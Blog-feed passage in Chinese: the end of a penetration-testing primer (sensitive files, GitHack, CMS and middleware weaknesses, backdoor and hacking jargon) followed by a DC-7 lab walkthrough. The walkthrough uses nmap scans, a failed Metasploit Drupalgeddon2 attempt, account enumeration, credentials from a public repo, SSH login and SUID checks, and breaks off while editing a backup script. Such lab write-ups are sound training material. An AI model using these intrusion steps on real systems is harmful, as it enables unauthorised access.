title="⑥网站敏感目录和文件"></a>⑥网站敏感目录和文件</h3><p>通常我们所说的敏感文件、敏感目录大概有以下几种：</p><blockquote><p>后台、robots.txt、数据库.log、sitemap.xml、mysql.sql、licence.txt、Git、hg&#x2F;Mercurial、svn&#x2F;Subversion、bzr&#x2F;Bazaar、Cvs、WEB-INF泄露、备份文件泄露、配置文件泄露。</p></blockquote><ul><li>Cansina</li></ul><p>用于发现网站的敏感目录和内容的安全测试工具，通过分析服务器的响应进行探测并使用sqlite保证数据持久性。</p><p>下载地址：<a href="https://github.com/deibit/cansina">https://github.com/deibit/cansina</a></p><ul><li>Githack</li></ul><p>git泄露利用脚本</p><p>下载地址：<a href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack</a></p><h2 id="威胁建模"><a href="#威胁建模" class="headerlink" title="威胁建模"></a>威胁建模</h2><p>利用上一个信息收集阶段获取的信息进行攻击规划。</p><p>标识目标组织可能存在的漏洞与缺陷，根据威胁模型确定下一步需要搜集的信息和攻击方法。</p><h2 id="渗透攻击"><a href="#渗透攻击" class="headerlink" title="渗透攻击"></a>渗透攻击</h2><p><a href="https://github.com/Getshell/LinuxTQ">linux提权方法论</a></p><h3 id="①对象"><a href="#①对象" class="headerlink" title="①对象"></a>①对象</h3><h4 id="1、CMS"><a href="#1、CMS" class="headerlink" title="1、CMS"></a>1、CMS</h4><p>内容管理系统，用于快速统一创建网站。许多使用CMS构建的网站均存在着对应的漏洞。比如，WordPress 是著名的个人网站CMS，之前我们进行靶场的攻打的时候发现它存在着不少可以被利用来提权的漏洞。</p><blockquote><p>常见的CMS网站平台有：</p><ul><li>WordPress</li><li>HubSpot</li><li>Joomla</li><li>WooCommerce</li><li>Drupal</li><li>Wix</li><li>BigCommerce</li><li>Shopify</li><li>ghost</li><li>Magento</li><li>Textpattern</li><li>Blogger</li><li>Bitrix24</li><li>TYPO3</li></ul></blockquote><p>可以通过<code>metasploit</code>、<code>searchsploit</code>等来搜索有关特定CMS平台的漏洞并尝试进行利用。</p><h4 id="2、中间件"><a href="#2、中间件" class="headerlink" title="2、中间件"></a>2、中间件</h4><p>中间件是一种独立的系统软件或服务程序，位于客户机&#x2F;服务器的操作系统之上，管理计算机资源和网络通讯，是连接两个独立应用程序或独立系统的软件。</p><p>常见的中间件有：<code>IIS、apache、ngnix、weblogic等</code>。</p><p>中间件本身并不能用来Getshell或提权。而且其一般不是以root用户启动的。但是，在特定条件下（比如存在一些安全漏洞）可以被利用来实施攻击。</p><blockquote><p>常见的三种架构：</p><ul><li>ASP &#x3D; windows + IIS + SQL Server&#x2F;Access + ASP</li><li>J2EE &#x3D; UNIX + Tomcat + Oracle + JSP</li><li>LAMP &#x3D; Linux + Apache + MySql + php</li></ul></blockquote><h4 id="3、后门"><a href="#3、后门" class="headerlink" title="3、后门"></a>3、后门</h4><p>后门是指黑客为了对主机进行长期的控制，在机器上种植的一段程序或留下的一个“入口”。</p><p>如何检测机器上的后门，主要是通过后门扫描工具来进行。比如，BackdoorBox、</p><p><a href="https://www.freebuf.com/articles/network/356576.html">常见系统后门技术总结与分析利用</a></p><p>一般来说，我们可以通过植入后门对目标主机进行监控。具体的就先不深入探究了。</p><h4 id="4、webshell"><a href="#4、webshell" class="headerlink" title="4、webshell"></a>4、webshell</h4><p>指网站后门。它通过web服务进行命令执行。</p><h3 id="②目标"><a href="#②目标" class="headerlink" title="②目标"></a>②目标</h3><h4 id="1、Getshell"><a href="#1、Getshell" class="headerlink" title="1、Getshell"></a>1、Getshell</h4><p>即<code>获取目标的命令执行权限</code>。</p><blockquote><p>shell，简单来说就是“为使用者提供操作页面”的命令解释器。</p></blockquote><h4 id="2、提权"><a href="#2、提权" class="headerlink" title="2、提权"></a>2、提权</h4><p>操作系统低权限的账户将自己提升为管理员权限使用的方法。</p><p><a href="https://www.cnblogs.com/sfsec/p/15163907.html">linux提权总结</a></p><h4 id="3、相关术语"><a href="#3、相关术语" class="headerlink" title="3、相关术语"></a>3、相关术语</h4><blockquote><ul><li>肉鸡：被黑客入侵并被长期驻扎的计算机或服务器。可以随意控制，可以是任意系统的设备，对象可以是企业，个人，政府等等所有单位。</li><li>抓鸡：利用程序的漏洞，使用自动化方式获取存在漏洞的行为。</li><li>撞库：撞库是黑客通过收集互联网已泄露的用户和密码信息，生成对应的字典表，尝试批量登陆其他网站后，得到一系列可以登录的用户。</li><li>拖库：拖库本来是数据库领域的术语，指从数据库中导出数据。到了黑客攻击泛滥的今天，它被用来指网站遭到入侵后，黑客窃取其数据库。</li><li>POC：全称”Proof of Concept”（ 概念验证），常指一段漏洞证明的代码。</li><li>EXP：全称”Exploit”（利用），指利用系统漏洞进行攻击的动作。</li><li>Payload：“有效载荷”，指成功exploit之后，真正在目标系统执行的代码&#x2F;指令。</li><li>ShellCode：“shell代码”，是Payload的一种，因其建立正向&#x2F;反向shell而得名。</li><li>APT攻击：Advanced Persistent Threat ，高级可持续性攻击，是指组织或者小团体利用先进的攻击手段对特定目标进行长期持续性网络攻击的攻击形式。（具有极强的隐蔽性、潜伏期长、持续性强、目标性强）。</li></ul></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>DC-7</title>
    <link href="/2024/07/30/DC-7/"/>
    <url>/2024/07/30/DC-7/</url>
    
    <content type="html"><![CDATA[<h1 id="DC-7"><a href="#DC-7" class="headerlink" title="DC-7"></a>DC-7</h1><h2 id="IP扫描"><a href="#IP扫描" class="headerlink" title="IP扫描"></a>IP扫描</h2><p>通过开关靶机对比nmap扫描结果得到：</p><p>记得将攻击主机和目标靶机置于同一种网络模式下</p><p>开靶机前：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721917100411.png" alt="img"></p><p>开靶机后：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721917123305.png" alt="img"></p><p>可以得到目标靶机的IP地址：<code>192.168.204.136</code></p><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><h3 id="tcp、nmap、服务扫描"><a href="#tcp、nmap、服务扫描" class="headerlink" title="tcp、nmap、服务扫描"></a>tcp、nmap、服务扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sT -p- 192.168.204.136<br>nmap -sN -p- 192.168.204.136<br>nmap -sV -p- 192.168.204.136<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721917269117.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721917348933.png" alt="img"></p><p>可以看到，开放的端口有：<code>22</code>、<code>80</code>，分别对应ssh远程连接服务和http网页服务。</p><h3 id="端口详细扫描"><a href="#端口详细扫描" class="headerlink" title="端口详细扫描"></a>端口详细扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sT -sV -sC -O -p 22,80 192.168.204.136<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721917572470.png" alt="img"></p><p>从中得知一些信息，22端口的ssh服务版本号。</p><p>80端口应该对应存在着一个网站，网站使用的框架是CMS Drupal（version 8），还有一些不被允许访问的目录文件：</p><blockquote><p>&#x2F;core&#x2F;、&#x2F;profiles&#x2F;、&#x2F;README.txt、&#x2F;web.config、&#x2F;admin&#x2F;、&#x2F;comment&#x2F;reply&#x2F;、 &#x2F;filter&#x2F;tips 、&#x2F;node&#x2F;add&#x2F; 、&#x2F;search&#x2F;、&#x2F;user&#x2F;register&#x2F;、&#x2F;user&#x2F;password&#x2F; 、&#x2F;user&#x2F;login&#x2F; 、&#x2F;user&#x2F;logout&#x2F;、&#x2F;index.php&#x2F;admin&#x2F; 、&#x2F;index.php&#x2F;comment&#x2F;reply&#x2F;</p></blockquote><p>根据名字可以做一个简要的判断，admin、password、login这些文件可能会有我们Getshell所需要的信息。</p><h2 id="nmap漏扫"><a href="#nmap漏扫" class="headerlink" title="nmap漏扫"></a>nmap漏扫</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -script=vuln -p 22,80 192.168.204.136<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721919457522.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721919498472.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721919511216.png" alt="img"></p><p>发现很多页面都可能存在csrf漏洞。但是csrf（跨站请求伪造）漏洞不好利用，需要抓取数据包伪造请求。</p><h2 id="网页信息检索"><a href="#网页信息检索" class="headerlink" title="网页信息检索"></a>网页信息检索</h2><p>首先访问目标网站<code>192.168.204.136</code>：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721919720170.png"></p><p>发现网站首页有提示信息：</p><blockquote><p>DC-7 introduces some “new” concepts, but I’ll leave you to figure out what they are. </p><p>While this challenge isn’t all that technical, if you need to resort to brute forcing or a dictionary attacks, you probably won’t succeed.</p><p>What you will have to do, is to think “outside” the box.</p><p>Way “outside” the box. </p><p>这里提示了，dc-7引入了一些新的概念，想利用爆破或者字典攻击，大概率不会成功。所以我们需要做的就是跳出思维定势，远远跳出思维定势。</p></blockquote><p>而且我们发现目标网站显示出来的网页并没有可以登陆的地方，只有一个搜索框“Search”，尝试在搜索框输入一些信息。比如输入指令<code>ls</code>，会发现它竟然要我们输入密码，这里的密码暂时不知道是不是用于用户身份验证的唯一密码还是对应搜索对象的访问密码。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721920133750.png" alt="img"></p><p>还记得我们上面通过nmap端口扫描得到的那些目录吗？尝试访问，看看能不能获取什么有效的信息。</p><blockquote><p>&#x2F;core&#x2F;、&#x2F;profiles&#x2F;、&#x2F;README.txt、&#x2F;web.config、&#x2F;admin&#x2F;、&#x2F;comment&#x2F;reply&#x2F;、 &#x2F;filter&#x2F;tips 、&#x2F;node&#x2F;add&#x2F; 、&#x2F;search&#x2F;、&#x2F;user&#x2F;register&#x2F;、&#x2F;user&#x2F;password&#x2F; 、&#x2F;user&#x2F;login&#x2F; 、&#x2F;user&#x2F;logout&#x2F;、&#x2F;index.php&#x2F;admin&#x2F; 、&#x2F;index.php&#x2F;comment&#x2F;reply&#x2F;</p></blockquote><p>访问上述的所有目录文件，大部分都没有返回什么有用的信息，不是由于权限不足被拒绝访问，就是发生了4XX系列的错误。</p><p>唯一有用的是找到了需要输入用户名和密码的登陆界面以及一个密码输入界面。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721920512004.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721920483152.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721920548271.png" alt="img"></p><p>① <a href="http://192.168.204.136/user/password/">http://192.168.204.136/user/password/</a></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721920724337.png" alt="img"></p><p>② <a href="http://192.168.204.136/user/login/">http://192.168.204.136/user/login/</a></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721920693292.png" alt="img"></p><h2 id="漏洞查找"><a href="#漏洞查找" class="headerlink" title="漏洞查找"></a>漏洞查找</h2><p>使用Metasploit查找有关Drupal的漏洞，前面进行nmap端口扫描的时候我们还知道Drupal的版本号是8，可以添加条件更加精确地找到相关漏洞。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">search Drupal<br>search Drupal 8<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721921400079.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721921379143.png" alt="img"></p><p>尝试利用最新的那个高危漏洞<code> exploit/unix/webapp/drupal_drupalgeddon2</code>，并查看其参数。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">use exploit/unix/webapp/drupal_drupalgeddon2<br>show options<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721921554774.png" alt="img"></p><p>修改可修改的<code>RHOSTS</code>参数值为目标靶机的IP地址，并查看其修改是否成功。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">set</span> RHOSTS 192.168.204.136<br>show options<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721921619643.png" alt="img"></p><p>尝试，是否能成功应用修改。执行<code>run/exploit</code>命令。</p><p>发现，报了<code>Unexpected reply</code>未期望的应答错误，而且最后也没有成功创建session，漏洞利用失败。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721921885749.png" alt="img"></p><p>当然，也可以尝试那个久一点的漏洞，但是很大概率会失败，要是真给你成功了，还说啥远远跳出惯性思维（&#x2F;doge）</p><h2 id="用户账户查找"><a href="#用户账户查找" class="headerlink" title="用户账户查找"></a>用户账户查找</h2><h3 id="数据包搜寻"><a href="#数据包搜寻" class="headerlink" title="数据包搜寻"></a>数据包搜寻</h3><p>对目标网站的关键网页进行抓包，尝试输入命令，看看抓取的数据包的内容组成。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721978418020.png" alt="img"></p><p>对网页<a href="http://192.168.204.136/user/password/%E8%BF%9B%E8%A1%8C%E6%8A%93%E5%8C%85">http://192.168.204.136/user/password/进行抓包</a></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721978552370.png" alt="img"></p><p>啊？尝试在上述<code>Username or email address</code>输入用户名<code>admin</code>，执行放行之后会跳转到登陆网页<a href="http://192.168.204.136/user/login/%EF%BC%8C%E5%B9%B6%E4%B8%94%E6%98%BE%E7%A4%BA%EF%BC%9A">http://192.168.204.136/user/login/，并且显示：</a></p><p><code>Further instructions have been sent to your email address.</code></p><p>—— 更多说明已经发送至您的邮箱地址</p><p>这里说明，有一个合法的用户名一定为<code>admin</code></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721978616197.png" alt="img"></p><p>尝试使用<code>admin 123456</code>进行登陆，抓包查看是什么情况</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721978973726.png" alt="img"></p><p>但是放行完毕之后显示了错误，如下图，其中抓取的有明文登陆信息的数据包如上所示。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721978991720.png" alt="img"></p><p>尝试点击<code>Reset your password</code>，会发现，它又跳转回这个password界面了。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721979099041.png" alt="img"></p><p>那既然如此，要不填一下我的邮箱？笨笨！那肯定不行啊！</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721979559988.png" alt="img"></p><p>尝试强行获取合法的用户名密码这条路暂时走不通了。</p><h3 id="网页信息提示"><a href="#网页信息提示" class="headerlink" title="网页信息提示"></a>网页信息提示</h3><p>返回目标网站的首页，再次仔细查看所有的提示。</p><p>整个网页显示界面如下：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721979915603.png" alt="img"></p><p>组成要素有：左上角<code>Home</code>目录，接下来是<code>Search</code>搜索框，然后其右边是一个欢迎提示，提示我们要跳出惯性思维的。然后左下角是<code>Powered by [Drupal](https://www.drupal.org)</code>表示该网站由Drupal提供支持，然后下面还有个<code>@DC7USER</code>。</p><p>首先，我们可以先来顺一下平常打靶场的惯性思维是什么，首先肯定是查找网页框架漏洞，尝试利用漏洞Getshell（或提权），或者是通过目录爆破或密码爆破，获得合法的用户账户。然后想办法反弹shell，查找用户目录下的文件或利用命令提权，最终找到flag文件。</p><p>既然这里提示说要远远跳出惯性思维，那就是说，这里办法对于这个目标靶场都不行。</p><p>因此，我们就需要关注一些可能平常并不会注意到的其它有用的信息。</p><p>比如上面在展示技术支持之后的<code>@DC7USER</code>，如果连接上上面的<code>Powered by</code>的话，也可以理解为<code>由DC7USER和Drupal提供支持</code>，那这个<code>DC7USER</code>可能就是一个有贡献的技术人员，可以尝试去通过网页搜索一下这个名字。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721980846000.png" alt="img"></p><p>我嘞个豆，还真有这个github账户。点进去看看。发现有一个<code>staffdb</code>仓库，继续点进去查看。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721980955536.png" alt="img"></p><h3 id="DC7USER的staffdb仓库信息检索"><a href="#DC7USER的staffdb仓库信息检索" class="headerlink" title="DC7USER的staffdb仓库信息检索"></a>DC7USER的staffdb仓库信息检索</h3><p>首先，查看<code>Readme</code>文件，说这个仓库中包含了一些代码，关于改变的代码。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721982451326.png" alt="img"></p><p>对仓库中的文件进行逐一排查，发现在<code>config.php</code>代码文件中出现了用户名密码等信息：</p><blockquote><p>servername &#x3D; localhost</p><p>username &#x3D; dc7user</p><p>password &#x3D; MdR3xOgB7#dW</p><p>dbname &#x3D; Staff</p><p>conn &#x3D; mysqli_connect($servername, $username, $password, $dbname);</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721982622019.png" alt="img"></p><p>在<code>createmany.php</code>中发现了疑似职员的两条信息，分别是CEO Mary和人事 Julie。</p><blockquote><p>‘Mary’, ‘Moe’, ‘CEO’, ‘46478415155456’, ‘<a href="mailto:&#109;&#x61;&#114;&#x79;&#64;&#x65;&#120;&#x61;&#109;&#112;&#x6c;&#101;&#46;&#x63;&#x6f;&#x6d;">&#109;&#x61;&#114;&#x79;&#64;&#x65;&#120;&#x61;&#109;&#112;&#x6c;&#101;&#46;&#x63;&#x6f;&#x6d;</a>‘</p><p>‘Julie’, ‘Dooley’, ‘Human Resources’, ‘46457131654’, ‘<a href="mailto:&#x6a;&#x75;&#x6c;&#105;&#x65;&#64;&#x65;&#x78;&#97;&#x6d;&#x70;&#108;&#101;&#x2e;&#99;&#111;&#x6d;">&#x6a;&#x75;&#x6c;&#105;&#x65;&#64;&#x65;&#x78;&#97;&#x6d;&#x70;&#108;&#101;&#x2e;&#99;&#111;&#x6d;</a>‘</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721982882990.png" alt="img"></p><p>然后其它的php代码文件也没啥有用的信息了。</p><h2 id="用户登陆"><a href="#用户登陆" class="headerlink" title="用户登陆"></a>用户登陆</h2><p>即：<code>获得目标用户的命令执行权限以及操作界面</code></p><p>上面信息检索获取到的有用信息如下，其中包含了明文形式的用户名和密码：</p><blockquote><p>servername &#x3D; localhost</p><p>username &#x3D; dc7user</p><p>password &#x3D; MdR3xOgB7#dW</p><p>dbname &#x3D; Staff</p><p>conn &#x3D; mysqli_connect($servername, $username, $password, $dbname);</p></blockquote><p><strong>（1）首先，先尝试连接一下mysql数据库呗</strong></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721983651021.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721983736766.png" alt="img"></p><p>但是发现不大行，密码正确但是访问被拒绝。修改一下主机信息为目标靶机的IP地址，再次尝试：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721983815703.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721983847338.png" alt="img"></p><p>发现无法连接惹。后面查找资料说可能端口号也得改，尝试修改之后还是无法连接。</p><ul><li><strong>嘻嘻，介绍一下使用命令行连接MySQL数据库的方法</strong></li></ul><p><a href="https://blog.csdn.net/qq_41062572/article/details/103234358">mysql使用cmd命令行方式连接数据库</a></p><p><code>mysql -h 本机地址 -u 用户名 -p 密码</code></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721991581789.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721991661140.png" alt="img"></p><p>- </p><p>那就使用上述获取的用户名和密码分别进行<strong>登陆界面测试</strong>和<strong>远程ssh连接测试</strong>。</p><blockquote><p>username &#x3D; dc7user</p><p>password &#x3D; MdR3xOgB7#dW</p></blockquote><p><strong>（2）登陆界面登陆</strong></p><p><a href="http://192.168.204.136/user/login/">http://192.168.204.136/user/login/</a></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721991869898.png" alt="img"></p><p>发现登陆失败。</p><p><strong>（3）ssh远程连接登陆</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh dc7user@192.168.204.136<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721992090749.png" alt="img"></p><p>发现登陆成功！注意哦！这里登陆的dc7user账户并不一定是目标靶机的合法用户。根据已有的提示，他是目标靶机的相关技术人员。我们获得他的shell之后可以搜寻更多能够帮助我们get到目标靶机shell的信息。</p><h2 id="Get-shell"><a href="#Get-shell" class="headerlink" title="Get shell"></a>Get shell</h2><h3 id="dc7user账户信息检索"><a href="#dc7user账户信息检索" class="headerlink" title="dc7user账户信息检索"></a>dc7user账户信息检索</h3><p>首先可以先明确一点，就是，尽管我们拿到的不是目标靶机的shell，但是为什么也要尝试提权，因为这个用户是技术提供者，管理员权限下说不定会有更加重要的文件或数据，这些数据对我们get目标靶机的shell很有帮助。</p><p>查看具有SIUD权限的命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721992165793.png" alt="img"></p><p>根据以往的经验，比较大可能能够提权成功的命令为：<code>exim4</code></p><p>查看sudo配置信息，<code>sudo -l</code></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721992327583.png" alt="img"></p><p>发现sudo命令被限制了。</p><p>查看当前用户目录列表，<code>ls</code>，发现有两个文件：<code>backups</code> 、<code>mbox</code></p><p>· 查看<code>backups</code> 文件夹，其包含了两个gpg后缀的文件，一个应该跟数据库有关，另一个和压缩文件有关</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721992484900.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721992472967.png" alt="img"></p><blockquote><ul><li>.tgz.gpg加密文件的解压</li></ul><p>以input_file.tgz.gpg 文件为例，需要先将其解密（用gpg命令）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">gpg --output output_file.tgz --decrypt input_file.tgz.gpg<br>tar -xvzf output_file.tgz<br></code></pre></td></tr></table></figure><p>然后会提示输入密钥….输入后回车，密钥正确的话就会得到output_file.tgz 文件，然后用tar命令解压.tgz就可以了</p><ul><li>.sql.gpg加密文件的解压</li></ul><p>同样需要密钥。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gpg --decrypt filename.sql.gpg &gt; filename.sql<br></code></pre></td></tr></table></figure></blockquote><p>咦~，本来想退回上级目录，继续查看第二个文件的，这个时候突然收到一条邮件信息：</p><p><code>/var/mail/dc7user</code></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721992957913.png" alt="img"></p><p>但是还是先查看<code>mbox</code>文件吧</p><p>· <code>mbox</code>，cat命令获取该文件的内容。哟嚯，不会是邮箱mailbox吧！！</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721993115456.png" alt="img"></p><p>比较显眼的信息：<code>Database dump saved to /home/dc7user/backups/website.sql</code></p><p>· 去<code>/var/mail/dc7user</code>查看新接收到的信息</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721993415979.png" alt="img"></p><p>和上述<code>mbox</code>显示出来的信息差不多，基本都指向我们要获取<code>/home/dc7user/backups/website.sql</code>这个文件。</p><p>另外，这些操作记录还有一个提示，使用的exim版本是：<code>Exim 4.89</code>，后面可以尝试通过搜查和利用漏洞getshell。</p><h4 id="1-website-sql-gpg文件解密"><a href="#1-website-sql-gpg文件解密" class="headerlink" title="1.website.sql.gpg文件解密"></a>1.website.sql.gpg文件解密</h4><p>尝试使用上述获得的用户密码来对gpg文件进行解密</p><blockquote><p>username &#x3D; dc7user</p><p>password &#x3D; MdR3xOgB7#dW</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gpg --decrypt website.sql.gpg &gt; website.sql<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721993729714.png" alt="img"></p><p>密码错误，解密失败。</p><p>回顾上面的操作记录信息，可以得知其使用了<code>/opt/scripts/backups.sh</code>D的备份脚本文件进行备份。那就看看它的具体内容，看看有什么提示。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721993959343.png" alt="img"></p><blockquote><p>.sh脚本程序的代码含义如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><span class="hljs-built_in">rm</span> /home/dc7user/backups/*<br><span class="hljs-built_in">cd</span> /var/www/html/<br>drush sql-dump --result-file=/home/dc7user/backups/website.sql<br><span class="hljs-built_in">cd</span> ..<br>tar -czf /home/dc7user/backups/website.tar.gz html/<br>gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.sql<br>gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.tar.gz<br><span class="hljs-built_in">chown</span> dc7user:dc7user /home/dc7user/backups/*<br><span class="hljs-built_in">rm</span> /home/dc7user/backups/website.sql<br><span class="hljs-built_in">rm</span> /home/dc7user/backups/website.tar.gz<br></code></pre></td></tr></table></figure><p>指定使用bash解释器来执行</p><p>删除 &#x2F;home&#x2F;dc7user&#x2F;backups&#x2F; 目录下的所有文件，注意哦，不会删除子目录，只删除文件</p><p>切换到 &#x2F;var&#x2F;www&#x2F;html&#x2F; 目录（web服务器的根目录）</p><p>使用<code>drush</code> Drupal shell 工具生成数据库备份，sql-dump命令将Drupal数据库导出到目标文件中</p><p>返回上一级目录</p><p>使用tar命令将 html&#x2F; 目录压缩成一个gzip格式的文件</p><p>使用<code>gpg</code>对 &#x2F;home&#x2F;dc7user&#x2F;backups&#x2F;website.sql 文件进行对称加密，并指定用于加密的密码</p><p>使用<code>gpg</code>对 &#x2F;home&#x2F;dc7user&#x2F;backups&#x2F;website.tar.gz 文件进行对称加密，密码与之前的相同</p><p>将 &#x2F;home&#x2F;dc7user&#x2F;backups&#x2F; 目录下所有文件的所有权更改为 dc7user 用户及其组，包括之前加密的文件。</p><p>删除未加密的 website.sql 文件</p><p>删除未加密的 website.tar.gz 文件</p></blockquote><p>程序执行之后会删掉那些明文文件。我在想，要不修改一下文件然后，删掉那些删除命令，看看能不能行。</p><p>先尝试执行<code>/opt/scripts/backups.sh</code>看看自己是否有执行权限吧。</p><p>哦豁！成功了！说明我们有执行权限。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721994182667.png" alt="img"></p><p>使用<code>nano</code>命令进入该.sh文件</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721994385247.png" alt="img"></p><p>发现这里提示不可写。那我们就尝试使用替代命令：<code>ctrl+\</code>，删掉最后两行。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721994686896.png" 